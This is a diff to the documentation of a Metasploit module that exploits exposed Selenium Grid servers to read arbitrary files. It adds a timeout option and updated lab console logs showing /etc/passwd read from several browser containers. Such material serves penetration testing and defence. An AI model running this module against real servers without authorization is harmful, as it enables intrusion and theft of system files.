@@ -47,6 +47,11 @@ This is the file to read. Default is `/etc/passwd`.
 
 This is the browser to use. Default is `firefox`.
 
+### TIMEOUT (required)
+
+This is the amount of time (in seconds) that the module will wait for the payload to be
+executed. Defaults to 75 seconds.
+
 
 ## Scenarios
 ### selenium/standalone-firefox:3.141.59 installed with Docker on Ubuntu 24.04
@@ -65,6 +70,7 @@ Module options (auxiliary/gather/selenium_file_read):
    RPORT     4444             yes       The target port (TCP)
    SCHEME    file             yes       The scheme to use
    SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   TIMEOUT   75               yes       Timeout for exploit (seconds)
    VHOST                      no        HTTP server virtual host
 
 
@@ -74,6 +80,7 @@ msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4445
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Version 3.141.59 detected
+[*] Started session (4a48aef3-9379-4cbe-9d6a-1ecc3176dc14).
 [+] /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -102,6 +109,7 @@ messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
 rtkit:x:105:106:RealtimeKit,,,:/proc:/usr/sbin/nologin
 pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 
+[*] Failed to delete the session (4a48aef3-9379-4cbe-9d6a-1ecc3176dc14). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
 [*] Auxiliary module execution completed
 ```
 
@@ -110,7 +118,8 @@ pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4446
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Selenium Grid version 4.x detected and ready.
+[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
+[*] Started session (eb790e48-318a-4949-a7ff-8566f181a609).
 [+] /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -138,6 +147,7 @@ messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
 rtkit:x:104:105:RealtimeKit,,,:/proc:/usr/sbin/nologin
 pulse:x:105:106:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 
+[*] Failed to delete the session (eb790e48-318a-4949-a7ff-8566f181a609). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
 [*] Auxiliary module execution completed
 ```
 
@@ -146,7 +156,8 @@ pulse:x:105:106:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4447
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Selenium Grid version 4.x detected and ready.
+[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
+[*] Started session (2b4d313e-6e42-4c33-8bc8-630103269ef7).
 [+] /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -175,6 +186,7 @@ messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
 rtkit:x:105:106:RealtimeKit,,,:/proc:/usr/sbin/nologin
 pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 
+[*] Failed to delete the session (2b4d313e-6e42-4c33-8bc8-630103269ef7). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
 [*] Auxiliary module execution completed
 ```
 
@@ -183,7 +195,8 @@ pulse:x:106:107:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
 msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4448
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Selenium Grid version 4.x detected and ready.
+[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
+[*] Started session (599a7d03-1eca-41f3-8726-3a192104dfc1).
 [+] /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -209,15 +222,17 @@ systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
 messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
 pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
 
+[*] Failed to delete the session (599a7d03-1eca-41f3-8726-3a192104dfc1). You may need to wait for the session to expire (default: 5 minutes) or manually delete the session for the next exploit to succeed.
 [*] Auxiliary module execution completed
 ```
 
 ### selenium/standalone-chrome:4.27.0 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4449 browser=chrome
+msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4453 BROWSER=chrome
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Selenium Grid version 4.x detected and ready.
+[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
+[*] Started session (363b104ba9d167f434518d3eb1add0c6).
 [+] /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -243,15 +258,17 @@ systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
 messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
 pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
 
+[*] Deleted session (363b104ba9d167f434518d3eb1add0c6).
 [*] Auxiliary module execution completed
 ```
 
 ### selenium/standalone-edge:4.27.0 installed with Docker on Ubuntu 24.04
 ```
-msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4450 browser=MicrosoftEdge
+msf6 auxiliary(gather/selenium_file_read) > run rhost=192.168.56.16 rport=4454 BROWSER=MicrosoftEdge
 [*] Running module against 192.168.56.16
 [*] Running automatic check ("set AutoCheck false" to disable)
-[+] The target appears to be vulnerable. Selenium Grid version 4.x detected and ready.
+[!] The service is running, but could not be validated. Selenium Grid version 4.x detected and ready.
+[*] Started session (80c4ac70d41d4ffc5585e750c94d9ac5).
 [+] /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -277,5 +294,6 @@ systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
 messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
 pulse:x:101:102:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
 
+[*] Deleted session (80c4ac70d41d4ffc5585e750c94d9ac5).
 [*] Auxiliary module execution completed
 ```
